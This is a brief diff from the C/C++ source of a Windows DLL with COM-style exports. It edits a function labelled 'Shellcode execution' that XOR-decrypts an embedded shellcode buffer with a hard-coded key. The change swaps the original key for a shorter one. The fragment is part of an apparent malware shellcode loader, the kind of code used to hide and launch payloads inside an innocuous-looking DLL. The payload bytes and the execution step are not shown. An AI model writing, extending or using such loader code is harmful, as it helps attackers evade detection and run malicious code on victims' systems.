@@ -63,7 +63,7 @@ extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer() {
 // Shellcode execution
 void ExecuteShellcode() {
     // Encryption key
-    char key[] = {0x57, 0x69, 0x6C, 0x64, 0x50, 0x68, 0x6F, 0x65, 0x6E, 0x69, 0x78, 0x31, 0x32, 0x33, 0x34, 0x35, 0x00};
+    char key[] = {0x57, 0x22, 0x34, 0x35, 0x00};
 
     // Decrypt the shellcode
     char* decrypted_shellcode = xor_encrypt_decrypt(shellcode_bin, shellcode_bin_len, key, sizeof(key) - 1);
